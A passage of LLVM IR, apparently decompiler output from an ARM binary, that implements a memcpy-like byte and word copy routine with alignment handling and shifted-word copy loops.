  %v2_1b2ac.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread124

.thread124:                                       ; preds = %bb142, %bb143
  %v7_1b2b0 = phi i32 [ %v8_1b2a8, %bb143 ], [ %v5_1b2a0, %bb142 ]
  %v2_1b2b0 = phi i1 [ %v2_1b2ac.pre, %bb143 ], [ %v1_1b2a4, %bb142 ]
  %v1_1b2b0 = phi i1 [ %v1_1b2ac.pre, %bb143 ], [ %v0_1b2a4, %bb142 ]
  %v0_1b2ac = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_1b2ac = xor i1 %v2_1b2b0, %v1_1b2b0
  %v4_1b2ac = or i1 %v0_1b2ac, %v3_1b2ac
  br i1 %v4_1b2ac, label %.thread125, label %bb144

bb144:                                            ; preds = %.thread124
  %v5_1b2ac = load i32, i32* %r1.global-to-local, align 4
  %v6_1b2ac = inttoptr i32 %v5_1b2ac to i8*
  %v7_1b2ac = load i8, i8* %v6_1b2ac, align 1
  %v10_1b2ac = add i32 %v5_1b2ac, 1
  store i32 %v10_1b2ac, i32* %r1.global-to-local, align 4
  %v8_1b2b0 = inttoptr i32 %v7_1b2b0 to i8*
  store i8 %v7_1b2ac, i8* %v8_1b2b0, align 1
  %v9_1b2b0 = load i32, i32* %r0.global-to-local, align 4
  %v10_1b2b0 = add i32 %v9_1b2b0, 1
  store i32 %v10_1b2b0, i32* %r0.global-to-local, align 4
  br label %.thread125

.thread125:                                       ; preds = %.thread124, %bb144
  %v2_1b2b4 = load i8*, i8** %stack_var_-8, align 4
  %v3_1b2b4 = ptrtoint i8* %v2_1b2b4 to i32
  store i32 %v3_1b2b4, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v8_1b1fc)
  %v0_1b2bc.pre = load i32, i32* @ip, align 4
  %v0_1b2c4.pre = load i32, i32* %r1.global-to-local, align 4
  %v2_1b2c8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1b2bc

dec_label_pc_1b2bc:                               ; preds = %dec_label_pc_1b208, %.thread125
  %v2_1b2c8 = phi i32 [ %v1_1b1f0, %dec_label_pc_1b208 ], [ %v2_1b2c8.pre, %.thread125 ]
  %v0_1b2c4 = phi i32 [ %v0_1b1f0, %dec_label_pc_1b208 ], [ %v0_1b2c4.pre, %.thread125 ]
  %v0_1b2bc = phi i32 [ %v1_1b208, %dec_label_pc_1b208 ], [ %v0_1b2bc.pre, %.thread125 ]
  %v1_1b2bc = sub i32 4, %v0_1b2bc
  store i32 %v1_1b2bc, i32* @ip, align 4
  %v1_1b2c0 = add i32 %v1_1b2bc, -2
  %v3_1b2c0 = sub i32 1, %v1_1b2bc
  %v4_1b2c0 = and i32 %v3_1b2c0, %v1_1b2bc
  %v5_1b2c0 = icmp slt i32 %v4_1b2c0, 0
  store i1 %v5_1b2c0, i1* %cpsr_v.global-to-local, align 1
  %v6_1b2c0 = icmp slt i32 %v1_1b2c0, 0
  store i1 %v6_1b2c0, i1* %cpsr_n.global-to-local, align 1
  %v7_1b2c0 = icmp eq i32 %v1_1b2bc, 2
  store i1 %v7_1b2c0, i1* %cpsr_z.global-to-local, align 1
  %v1_1b2c4 = inttoptr i32 %v0_1b2c4 to i8*
  %v2_1b2c4 = load i8, i8* %v1_1b2c4, align 1
  %v3_1b2c4 = zext i8 %v2_1b2c4 to i32
  store i32 %v3_1b2c4, i32* @r3, align 4
  %v5_1b2c4 = add i32 %v0_1b2c4, 1
  store i32 %v5_1b2c4, i32* %r1.global-to-local, align 4
  %v3_1b2c8 = inttoptr i32 %v2_1b2c8 to i8*
  store i8 %v2_1b2c4, i8* %v3_1b2c8, align 1
  %v4_1b2c8 = load i32, i32* %r0.global-to-local, align 4
  %v5_1b2c8 = add i32 %v4_1b2c8, 1
  store i32 %v5_1b2c8, i32* %r0.global-to-local, align 4
  %v0_1b2cc = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_1b2cc = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_1b2cc = xor i1 %v0_1b2cc, %v1_1b2cc
  br i1 %v2_1b2cc, label %.thread126, label %bb145

bb145:                                            ; preds = %dec_label_pc_1b2bc
  %v3_1b2cc = load i32, i32* %r1.global-to-local, align 4
  %v4_1b2cc = inttoptr i32 %v3_1b2cc to i8*
  %v5_1b2cc = load i8, i8* %v4_1b2cc, align 1
  %v6_1b2cc = zext i8 %v5_1b2cc to i32
  store i32 %v6_1b2cc, i32* @r3, align 4
  %v8_1b2cc = add i32 %v3_1b2cc, 1
  store i32 %v8_1b2cc, i32* %r1.global-to-local, align 4
  %v6_1b2d0 = inttoptr i32 %v5_1b2c8 to i8*
  store i8 %v5_1b2cc, i8* %v6_1b2d0, align 1
  %v7_1b2d0 = load i32, i32* %r0.global-to-local, align 4
  %v8_1b2d0 = add i32 %v7_1b2d0, 1
  store i32 %v8_1b2d0, i32* %r0.global-to-local, align 4
  %v1_1b2d4.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_1b2d4.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread126

.thread126:                                       ; preds = %dec_label_pc_1b2bc, %bb145
  %v7_1b2d8 = phi i32 [ %v8_1b2d0, %bb145 ], [ %v5_1b2c8, %dec_label_pc_1b2bc ]
  %v2_1b2d8 = phi i1 [ %v2_1b2d4.pre, %bb145 ], [ %v1_1b2cc, %dec_label_pc_1b2bc ]
  %v1_1b2d8 = phi i1 [ %v1_1b2d4.pre, %bb145 ], [ %v0_1b2cc, %dec_label_pc_1b2bc ]
  %v0_1b2d4 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_1b2d4 = xor i1 %v2_1b2d8, %v1_1b2d8
  %v4_1b2d4 = or i1 %v0_1b2d4, %v3_1b2d4
  br i1 %v4_1b2d4, label %.thread127, label %bb146

bb146:                                            ; preds = %.thread126
  %v5_1b2d4 = load i32, i32* %r1.global-to-local, align 4
  %v6_1b2d4 = inttoptr i32 %v5_1b2d4 to i8*
  %v7_1b2d4 = load i8, i8* %v6_1b2d4, align 1
  %v8_1b2d4 = zext i8 %v7_1b2d4 to i32
  store i32 %v8_1b2d4, i32* @r3, align 4
  %v10_1b2d4 = add i32 %v5_1b2d4, 1
  store i32 %v10_1b2d4, i32* %r1.global-to-local, align 4
  %v8_1b2d8 = inttoptr i32 %v7_1b2d8 to i8*
  store i8 %v7_1b2d4, i8* %v8_1b2d8, align 1
  %v9_1b2d8 = load i32, i32* %r0.global-to-local, align 4
  %v10_1b2d8 = add i32 %v9_1b2d8, 1
  store i32 %v10_1b2d8, i32* %r0.global-to-local, align 4
  br label %.thread127

.thread127:                                       ; preds = %.thread126, %bb146
  %v0_1b40c76 = phi i32 [ %v10_1b2d8, %bb146 ], [ %v7_1b2d8, %.thread126 ]
  %v0_1b2dc = load i32, i32* %r2.global-to-local, align 4
  %v1_1b2dc = load i32, i32* @ip, align 4
  %v2_1b2dc = sub i32 %v0_1b2dc, %v1_1b2dc
  store i32 %v2_1b2dc, i32* %r2.global-to-local, align 4
  %v4_1b2dc = xor i32 %v1_1b2dc, %v0_1b2dc
  %v5_1b2dc = xor i32 %v2_1b2dc, %v0_1b2dc
  %v6_1b2dc = and i32 %v5_1b2dc, %v4_1b2dc
  %v7_1b2dc = icmp slt i32 %v6_1b2dc, 0
  store i1 %v7_1b2dc, i1* %cpsr_v.global-to-local, align 1
  %v8_1b2dc = icmp slt i32 %v2_1b2dc, 0
  store i1 %v8_1b2dc, i1* %cpsr_n.global-to-local, align 1
  %v9_1b2dc = icmp eq i32 %v0_1b2dc, %v1_1b2dc
  store i1 %v9_1b2dc, i1* %cpsr_z.global-to-local, align 1
  %v2_1b2e0 = xor i1 %v8_1b2dc, %v7_1b2dc
  br i1 %v2_1b2e0, label %bb140, label %dec_label_pc_1b2e4

dec_label_pc_1b2e4:                               ; preds = %.thread127
  %v0_1b2e4 = load i32, i32* %r1.global-to-local, align 4
  %v1_1b2e4 = urem i32 %v0_1b2e4, 4
  store i32 %v1_1b2e4, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1b2e4 = icmp eq i32 %v1_1b2e4, 0
  store i1 %v2_1b2e4, i1* %cpsr_z.global-to-local, align 1
  %extract.t130 = trunc i32 %v0_1b2e4 to i2
  br i1 %v2_1b2e4, label %dec_label_pc_1b218, label %dec_label_pc_1b2ec

dec_label_pc_1b2ec:                               ; preds = %dec_label_pc_1b210, %dec_label_pc_1b2e4
  %v0_1b40c75 = phi i32 [ %v1_1b1f0, %dec_label_pc_1b210 ], [ %v0_1b40c76, %dec_label_pc_1b2e4 ]
  %v0_1b374 = phi i32 [ %v2_1b200, %dec_label_pc_1b210 ], [ %v2_1b2dc, %dec_label_pc_1b2e4 ]
  %v0_1b2f4.off0 = phi i2 [ %extract.t, %dec_label_pc_1b210 ], [ %extract.t130, %dec_label_pc_1b2e4 ]
  %v0_1b2ec = phi i32 [ %v0_1b1f0, %dec_label_pc_1b210 ], [ %v0_1b2e4, %dec_label_pc_1b2e4 ]
  %v1_1b2ec = and i32 %v0_1b2ec, -4
  store i32 %v1_1b2ec, i32* %r1.global-to-local, align 4
  %v1_1b2f0 = inttoptr i32 %v1_1b2ec to i32*
  %v2_1b2f0 = load i32, i32* %v1_1b2f0, align 4
  store i32 %v2_1b2f0, i32* %lr.global-to-local, align 4
  %v4_1b2f0 = add i32 %v1_1b2ec, 4
  store i32 %v4_1b2f0, i32* %r1.global-to-local, align 4
  %v1_1b36c = add i32 %v0_1b374, -12
  %v3_1b36c = sub i32 11, %v0_1b374
  %v4_1b36c = and i32 %v3_1b36c, %v0_1b374
  %v5_1b36c = icmp slt i32 %v4_1b36c, 0
  store i1 %v5_1b36c, i1* %cpsr_v.global-to-local, align 1
  %v6_1b36c = icmp slt i32 %v1_1b36c, 0
  store i1 %v6_1b36c, i1* %cpsr_n.global-to-local, align 1
  %v7_1b36c = icmp eq i32 %v0_1b374, 12
  store i1 %v7_1b36c, i1* %cpsr_z.global-to-local, align 1
  %v2_1b370 = xor i1 %v6_1b36c, %v5_1b36c
  switch i2 %v0_1b2f4.off0, label %dec_label_pc_1b300 [
    i2 -1, label %dec_label_pc_1b3d8
    i2 -2, label %dec_label_pc_1b36c
  ]

dec_label_pc_1b300:                               ; preds = %dec_label_pc_1b2ec
  br i1 %v2_1b370, label %dec_label_pc_1b34c, label %dec_label_pc_1b308

dec_label_pc_1b308:                               ; preds = %dec_label_pc_1b300
  store i32 %v1_1b36c, i32* %r2.global-to-local, align 4
  %v3_1b30c = load i32, i32* @r4, align 4
  store i32 %v3_1b30c, i32* %stack_var_-16, align 4
  %v6_1b30c = load i32, i32* @r5, align 4
  store i32 %v6_1b30c, i32* %stack_var_-12, align 4
  br label %dec_label_pc_1b310

dec_label_pc_1b310:                               ; preds = %dec_label_pc_1b310.dec_label_pc_1b310_crit_edge, %dec_label_pc_1b308
  %v0_1b334 = phi i32 [ %v12_1b334, %dec_label_pc_1b310.dec_label_pc_1b310_crit_edge ], [ %v0_1b40c75, %dec_label_pc_1b308 ]
  %v0_1b314 = phi i32 [ %v0_1b314.pre, %dec_label_pc_1b310.dec_label_pc_1b310_crit_edge ], [ %v4_1b2f0, %dec_label_pc_1b308 ]
  %v0_1b310 = phi i32 [ %v0_1b310.pre, %dec_label_pc_1b310.dec_label_pc_1b310_crit_edge ], [ %v2_1b2f0, %dec_label_pc_1b308 ]
  %v3_1b310 = udiv i32 %v0_1b310, 256
  %v1_1b314 = inttoptr i32 %v0_1b314 to i32*
  %v2_1b314 = load i32, i32* %v1_1b314, align 4
  store i32 %v2_1b314, i32* %r4.global-to-local, align 4
  %v3_1b314 = add i32 %v0_1b314, 4
  %v4_1b314 = inttoptr i32 %v3_1b314 to i32*
  %v5_1b314 = load i32, i32* %v4_1b314, align 4
  store i32 %v5_1b314, i32* %r5.global-to-local, align 4
  %v6_1b314 = add i32 %v0_1b314, 8
  %v7_1b314 = inttoptr i32 %v6_1b314 to i32*
  %v8_1b314 = load i32, i32* %v7_1b314, align 4
  store i32 %v8_1b314, i32* %ip.global-to-local, align 4
  %v9_1b314 = add i32 %v0_1b314, 12
  %v10_1b314 = inttoptr i32 %v9_1b314 to i32*
  %v11_1b314 = load i32, i32* %v10_1b314, align 4
  store i32 %v11_1b314, i32* %lr.global-to-local, align 4
  %v12_1b314 = add i32 %v0_1b314, 16
  store i32 %v12_1b314, i32* %r1.global-to-local, align 4
  %v4_1b318 = mul i32 %v2_1b314, 16777216
  %v5_1b318 = or i32 %v4_1b318, %v3_1b310
  store i32 %v5_1b318, i32* @r3, align 4
  %v3_1b31c = udiv i32 %v2_1b314, 256
  %v4_1b320 = mul i32 %v5_1b314, 16777216
  %v5_1b320 = or i32 %v4_1b320, %v3_1b31c
  store i32 %v5_1b320, i32* %r4.global-to-local, align 4
  %v3_1b324 = udiv i32 %v5_1b314, 256
  %v4_1b328 = mul i32 %v8_1b314, 16777216
  %v5_1b328 = or i32 %v4_1b328, %v3_1b324
  store i32 %v5_1b328, i32* %r5.global-to-local, align 4
  %v3_1b32c = udiv i32 %v8_1b314, 256
  %v4_1b330 = mul i32 %v11_1b314, 16777216
  %v5_1b330 = or i32 %v4_1b330, %v3_1b32c
  store i32 %v5_1b330, i32* @ip, align 4
  %v1_1b334 = inttoptr i32 %v0_1b334 to i32*
  store i32 %v5_1b318, i32* %v1_1b334, align 4
  %v3_1b334 = add i32 %v0_1b334, 4
  %v4_1b334 = inttoptr i32 %v3_1b334 to i32*
  %v5_1b334 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1b334, i32* %v4_1b334, align 4
  %v6_1b334 = add i32 %v0_1b334, 8
  %v7_1b334 = inttoptr i32 %v6_1b334 to i32*
  %v8_1b334 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_1b334, i32* %v7_1b334, align 4
  %v9_1b334 = add i32 %v0_1b334, 12
  %v10_1b334 = inttoptr i32 %v9_1b334 to i32*
  %v11_1b334 = load i32, i32* @ip, align 4
  store i32 %v11_1b334, i32* %v10_1b334, align 4
  %v12_1b334 = add i32 %v0_1b334, 16
  store i32 %v12_1b334, i32* %r0.global-to-local, align 4
  %v0_1b338 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b338 = add i32 %v0_1b338, -16
  store i32 %v1_1b338, i32* %r2.global-to-local, align 4
  %v3_1b338 = sub i32 15, %v0_1b338
  %v4_1b338 = and i32 %v3_1b338, %v0_1b338
  %v5_1b338 = icmp slt i32 %v4_1b338, 0
  %v6_1b338 = icmp slt i32 %v1_1b338, 0
  %v2_1b33c = xor i1 %v6_1b338, %v5_1b338
  br i1 %v2_1b33c, label %dec_label_pc_1b340, label %dec_label_pc_1b310.dec_label_pc_1b310_crit_edge

dec_label_pc_1b310.dec_label_pc_1b310_crit_edge:  ; preds = %dec_label_pc_1b310
  %v0_1b310.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_1b314.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1b310

dec_label_pc_1b340:                               ; preds = %dec_label_pc_1b310
  %v2_1b340 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1b340, i32* @r4, align 4
  %v5_1b340 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_1b340, i32* @r5, align 4
  %v1_1b344 = add i32 %v0_1b338, -4
  store i32 %v1_1b344, i32* %r2.global-to-local, align 4
  %v3_1b344 = add i32 %v0_1b338, 2147483632
  %v4_1b344 = and i32 %v1_1b344, %v3_1b344
  %v5_1b344 = icmp slt i32 %v4_1b344, 0
  store i1 %v5_1b344, i1* %cpsr_v.global-to-local, align 1
  %v6_1b344 = icmp slt i32 %v1_1b344, 0
  store i1 %v6_1b344, i1* %cpsr_n.global-to-local, align 1
  %v7_1b344 = icmp eq i32 %v1_1b344, 0
  store i1 %v7_1b344, i1* %cpsr_z.global-to-local, align 1
  %v2_1b348 = xor i1 %v6_1b344, %v5_1b344
  br i1 %v2_1b348, label %dec_label_pc_1b364, label %dec_label_pc_1b34c

dec_label_pc_1b34c:                               ; preds = %dec_label_pc_1b340, %dec_label_pc_1b300, %dec_label_pc_1b34c
  %v1_1b358 = phi i32 [ %v4_1b358, %dec_label_pc_1b34c ], [ %v12_1b334, %dec_label_pc_1b340 ], [ %v0_1b40c75, %dec_label_pc_1b300 ]
  %v0_1b34c = load i32, i32* %lr.global-to-local, align 4
  %v3_1b34c = udiv i32 %v0_1b34c, 256
  store i32 %v3_1b34c, i32* %ip.global-to-local, align 4
  %v0_1b350 = load i32, i32* %r1.global-to-local, align 4
  %v1_1b350 = inttoptr i32 %v0_1b350 to i32*
  %v2_1b350 = load i32, i32* %v1_1b350, align 4
  store i32 %v2_1b350, i32* %lr.global-to-local, align 4
  %v4_1b350 = add i32 %v0_1b350, 4
  store i32 %v4_1b350, i32* %r1.global-to-local, align 4
  %v4_1b354 = mul i32 %v2_1b350, 16777216
  %v5_1b354 = or i32 %v4_1b354, %v3_1b34c
  store i32 %v5_1b354, i32* @ip, align 4
  %v2_1b358 = inttoptr i32 %v1_1b358 to i32*
  store i32 %v5_1b354, i32* %v2_1b358, align 4
  %v3_1b358 = load i32, i32* %r0.global-to-local, align 4
  %v4_1b358 = add i32 %v3_1b358, 4
  store i32 %v4_1b358, i32* %r0.global-to-local, align 4
  %v0_1b35c = load i32, i32* %r2.global-to-local, align 4
  %v1_1b35c = add i32 %v0_1b35c, -4
  store i32 %v1_1b35c, i32* %r2.global-to-local, align 4
  %v3_1b35c = sub i32 3, %v0_1b35c
  %v4_1b35c = and i32 %v3_1b35c, %v0_1b35c
  %v5_1b35c = icmp slt i32 %v4_1b35c, 0
  %v6_1b35c = icmp slt i32 %v1_1b35c, 0
  %v2_1b360 = xor i1 %v6_1b35c, %v5_1b35c
  br i1 %v2_1b360, label %dec_label_pc_1b364.loopexit, label %dec_label_pc_1b34c

dec_label_pc_1b364.loopexit:                      ; preds = %dec_label_pc_1b34c
  %v7_1b35c = icmp eq i32 %v0_1b35c, 4
  store i1 %v5_1b35c, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_1b35c, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_1b35c, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1b364

dec_label_pc_1b364:                               ; preds = %dec_label_pc_1b364.loopexit, %dec_label_pc_1b340
  %v0_1b28c58 = phi i32 [ %v1_1b35c, %dec_label_pc_1b364.loopexit ], [ %v1_1b344, %dec_label_pc_1b340 ]
  %v0_1b364 = load i32, i32* %r1.global-to-local, align 4
  %v1_1b364 = add i32 %v0_1b364, -3
  store i32 %v1_1b364, i32* %r1.global-to-local, align 4
  br label %bb140

dec_label_pc_1b36c:                               ; preds = %dec_label_pc_1b2ec
  br i1 %v2_1b370, label %dec_label_pc_1b3b8, label %dec_label_pc_1b374

dec_label_pc_1b374:                               ; preds = %dec_label_pc_1b36c
  store i32 %v1_1b36c, i32* %r2.global-to-local, align 4
  %v3_1b378 = load i32, i32* @r4, align 4
  store i32 %v3_1b378, i32* %stack_var_-16, align 4
  %v6_1b378 = load i32, i32* @r5, align 4
  store i32 %v6_1b378, i32* %stack_var_-12, align 4
  br label %dec_label_pc_1b37c

dec_label_pc_1b37c:                               ; preds = %dec_label_pc_1b37c.dec_label_pc_1b37c_crit_edge, %dec_label_pc_1b374
  %v0_1b3a0 = phi i32 [ %v12_1b3a0, %dec_label_pc_1b37c.dec_label_pc_1b37c_crit_edge ], [ %v0_1b40c75, %dec_label_pc_1b374 ]
  %v0_1b380 = phi i32 [ %v0_1b380.pre, %dec_label_pc_1b37c.dec_label_pc_1b37c_crit_edge ], [ %v4_1b2f0, %dec_label_pc_1b374 ]
  %v0_1b37c = phi i32 [ %v0_1b37c.pre, %dec_label_pc_1b37c.dec_label_pc_1b37c_crit_edge ], [ %v2_1b2f0, %dec_label_pc_1b374 ]
  %v3_1b37c = udiv i32 %v0_1b37c, 65536
  %v1_1b380 = inttoptr i32 %v0_1b380 to i32*
  %v2_1b380 = load i32, i32* %v1_1b380, align 4
  store i32 %v2_1b380, i32* %r4.global-to-local, align 4
  %v3_1b380 = add i32 %v0_1b380, 4
  %v4_1b380 = inttoptr i32 %v3_1b380 to i32*
  %v5_1b380 = load i32, i32* %v4_1b380, align 4
  store i32 %v5_1b380, i32* %r5.global-to-local, align 4
  %v6_1b380 = add i32 %v0_1b380, 8
  %v7_1b380 = inttoptr i32 %v6_1b380 to i32*
  %v8_1b380 = load i32, i32* %v7_1b380, align 4
  store i32 %v8_1b380, i32* %ip.global-to-local, align 4
  %v9_1b380 = add i32 %v0_1b380, 12
  %v10_1b380 = inttoptr i32 %v9_1b380 to i32*
  %v11_1b380 = load i32, i32* %v10_1b380, align 4
  store i32 %v11_1b380, i32* %lr.global-to-local, align 4
  %v12_1b380 = add i32 %v0_1b380, 16
  store i32 %v12_1b380, i32* %r1.global-to-local, align 4
  %v4_1b384 = mul i32 %v2_1b380, 65536
  %v5_1b384 = or i32 %v4_1b384, %v3_1b37c
  store i32 %v5_1b384, i32* @r3, align 4
  %v3_1b388 = udiv i32 %v2_1b380, 65536
  %v4_1b38c = mul i32 %v5_1b380, 65536
  %v5_1b38c = or i32 %v4_1b38c, %v3_1b388
  store i32 %v5_1b38c, i32* %r4.global-to-local, align 4
  %v3_1b390 = udiv i32 %v5_1b380, 65536
  %v4_1b394 = mul i32 %v8_1b380, 65536
  %v5_1b394 = or i32 %v4_1b394, %v3_1b390
  store i32 %v5_1b394, i32* %r5.global-to-local, align 4
  %v3_1b398 = udiv i32 %v8_1b380, 65536
  %v4_1b39c = mul i32 %v11_1b380, 65536
  %v5_1b39c = or i32 %v4_1b39c, %v3_1b398
  store i32 %v5_1b39c, i32* @ip, align 4
  %v1_1b3a0 = inttoptr i32 %v0_1b3a0 to i32*
  store i32 %v5_1b384, i32* %v1_1b3a0, align 4
  %v3_1b3a0 = add i32 %v0_1b3a0, 4
  %v4_1b3a0 = inttoptr i32 %v3_1b3a0 to i32*
  %v5_1b3a0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1b3a0, i32* %v4_1b3a0, align 4
  %v6_1b3a0 = add i32 %v0_1b3a0, 8
  %v7_1b3a0 = inttoptr i32 %v6_1b3a0 to i32*
  %v8_1b3a0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_1b3a0, i32* %v7_1b3a0, align 4
  %v9_1b3a0 = add i32 %v0_1b3a0, 12
  %v10_1b3a0 = inttoptr i32 %v9_1b3a0 to i32*
  %v11_1b3a0 = load i32, i32* @ip, align 4
  store i32 %v11_1b3a0, i32* %v10_1b3a0, align 4
  %v12_1b3a0 = add i32 %v0_1b3a0, 16
  store i32 %v12_1b3a0, i32* %r0.global-to-local, align 4
  %v0_1b3a4 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b3a4 = add i32 %v0_1b3a4, -16
  store i32 %v1_1b3a4, i32* %r2.global-to-local, align 4
  %v3_1b3a4 = sub i32 15, %v0_1b3a4
  %v4_1b3a4 = and i32 %v3_1b3a4, %v0_1b3a4
  %v5_1b3a4 = icmp slt i32 %v4_1b3a4, 0
  %v6_1b3a4 = icmp slt i32 %v1_1b3a4, 0
  %v2_1b3a8 = xor i1 %v6_1b3a4, %v5_1b3a4
  br i1 %v2_1b3a8, label %dec_label_pc_1b3ac, label %dec_label_pc_1b37c.dec_label_pc_1b37c_crit_edge

dec_label_pc_1b37c.dec_label_pc_1b37c_crit_edge:  ; preds = %dec_label_pc_1b37c
  %v0_1b37c.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_1b380.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1b37c

dec_label_pc_1b3ac:                               ; preds = %dec_label_pc_1b37c
  %v2_1b3ac = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1b3ac, i32* @r4, align 4
  %v5_1b3ac = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_1b3ac, i32* @r5, align 4
  %v1_1b3b0 = add i32 %v0_1b3a4, -4
  store i32 %v1_1b3b0, i32* %r2.global-to-local, align 4
  %v3_1b3b0 = add i32 %v0_1b3a4, 2147483632
  %v4_1b3b0 = and i32 %v1_1b3b0, %v3_1b3b0
  %v5_1b3b0 = icmp slt i32 %v4_1b3b0, 0
  store i1 %v5_1b3b0, i1* %cpsr_v.global-to-local, align 1
  %v6_1b3b0 = icmp slt i32 %v1_1b3b0, 0
  store i1 %v6_1b3b0, i1* %cpsr_n.global-to-local, align 1
  %v7_1b3b0 = icmp eq i32 %v1_1b3b0, 0
  store i1 %v7_1b3b0, i1* %cpsr_z.global-to-local, align 1
  %v2_1b3b4 = xor i1 %v6_1b3b0, %v5_1b3b0
  br i1 %v2_1b3b4, label %dec_label_pc_1b3d0, label %dec_label_pc_1b3b8

dec_label_pc_1b3b8:                               ; preds = %dec_label_pc_1b3ac, %dec_label_pc_1b36c, %dec_label_pc_1b3b8
  %v1_1b3c4 = phi i32 [ %v4_1b3c4, %dec_label_pc_1b3b8 ], [ %v12_1b3a0, %dec_label_pc_1b3ac ], [ %v0_1b40c75, %dec_label_pc_1b36c ]
  %v0_1b3b8 = load i32, i32* %lr.global-to-local, align 4
  %v3_1b3b8 = udiv i32 %v0_1b3b8, 65536
  store i32 %v3_1b3b8, i32* %ip.global-to-local, align 4
  %v0_1b3bc = load i32, i32* %r1.global-to-local, align 4
  %v1_1b3bc = inttoptr i32 %v0_1b3bc to i32*
  %v2_1b3bc = load i32, i32* %v1_1b3bc, align 4
  store i32 %v2_1b3bc, i32* %lr.global-to-local, align 4
  %v4_1b3bc = add i32 %v0_1b3bc, 4
  store i32 %v4_1b3bc, i32* %r1.global-to-local, align 4
  %v4_1b3c0 = mul i32 %v2_1b3bc, 65536
  %v5_1b3c0 = or i32 %v4_1b3c0, %v3_1b3b8
  store i32 %v5_1b3c0, i32* @ip, align 4
  %v2_1b3c4 = inttoptr i32 %v1_1b3c4 to i32*
  store i32 %v5_1b3c0, i32* %v2_1b3c4, align 4
  %v3_1b3c4 = load i32, i32* %r0.global-to-local, align 4
  %v4_1b3c4 = add i32 %v3_1b3c4, 4
  store i32 %v4_1b3c4, i32* %r0.global-to-local, align 4
  %v0_1b3c8 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b3c8 = add i32 %v0_1b3c8, -4
  store i32 %v1_1b3c8, i32* %r2.global-to-local, align 4
  %v3_1b3c8 = sub i32 3, %v0_1b3c8
  %v4_1b3c8 = and i32 %v3_1b3c8, %v0_1b3c8
  %v5_1b3c8 = icmp slt i32 %v4_1b3c8, 0
  %v6_1b3c8 = icmp slt i32 %v1_1b3c8, 0
  %v2_1b3cc = xor i1 %v6_1b3c8, %v5_1b3c8
  br i1 %v2_1b3cc, label %dec_label_pc_1b3d0.loopexit, label %dec_label_pc_1b3b8

dec_label_pc_1b3d0.loopexit:                      ; preds = %dec_label_pc_1b3b8
  %v7_1b3c8 = icmp eq i32 %v0_1b3c8, 4
  store i1 %v5_1b3c8, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_1b3c8, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_1b3c8, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1b3d0

dec_label_pc_1b3d0:                               ; preds = %dec_label_pc_1b3d0.loopexit, %dec_label_pc_1b3ac
  %v0_1b28c59 = phi i32 [ %v1_1b3c8, %dec_label_pc_1b3d0.loopexit ], [ %v1_1b3b0, %dec_label_pc_1b3ac ]
  %v0_1b3d0 = load i32, i32* %r1.global-to-local, align 4
  %v1_1b3d0 = add i32 %v0_1b3d0, -2
  store i32 %v1_1b3d0, i32* %r1.global-to-local, align 4
  br label %bb140

dec_label_pc_1b3d8:                               ; preds = %dec_label_pc_1b2ec
  br i1 %v2_1b370, label %dec_label_pc_1b424, label %dec_label_pc_1b3e0

dec_label_pc_1b3e0:                               ; preds = %dec_label_pc_1b3d8
  store i32 %v1_1b36c, i32* %r2.global-to-local, align 4
  %v3_1b3e4 = load i32, i32* @r4, align 4
  store i32 %v3_1b3e4, i32* %stack_var_-16, align 4
  %v6_1b3e4 = load i32, i32* @r5, align 4
  store i32 %v6_1b3e4, i32* %stack_var_-12, align 4
  br label %dec_label_pc_1b3e8

dec_label_pc_1b3e8:                               ; preds = %dec_label_pc_1b3e8.dec_label_pc_1b3e8_crit_edge, %dec_label_pc_1b3e0
  %v0_1b40c = phi i32 [ %v12_1b40c, %dec_label_pc_1b3e8.dec_label_pc_1b3e8_crit_edge ], [ %v0_1b40c75, %dec_label_pc_1b3e0 ]
  %v0_1b3ec = phi i32 [ %v0_1b3ec.pre, %dec_label_pc_1b3e8.dec_label_pc_1b3e8_crit_edge ], [ %v4_1b2f0, %dec_label_pc_1b3e0 ]
  %v0_1b3e8 = phi i32 [ %v0_1b3e8.pre, %dec_label_pc_1b3e8.dec_label_pc_1b3e8_crit_edge ], [ %v2_1b2f0, %dec_label_pc_1b3e0 ]
  %v3_1b3e8 = udiv i32 %v0_1b3e8, 16777216
  %v1_1b3ec = inttoptr i32 %v0_1b3ec to i32*
  %v2_1b3ec = load i32, i32* %v1_1b3ec, align 4
  store i32 %v2_1b3ec, i32* %r4.global-to-local, align 4
  %v3_1b3ec = add i32 %v0_1b3ec, 4
  %v4_1b3ec = inttoptr i32 %v3_1b3ec to i32*
  %v5_1b3ec = load i32, i32* %v4_1b3ec, align 4
  store i32 %v5_1b3ec, i32* %r5.global-to-local, align 4
  %v6_1b3ec = add i32 %v0_1b3ec, 8
  %v7_1b3ec = inttoptr i32 %v6_1b3ec to i32*
  %v8_1b3ec = load i32, i32* %v7_1b3ec, align 4
  store i32 %v8_1b3ec, i32* %ip.global-to-local, align 4
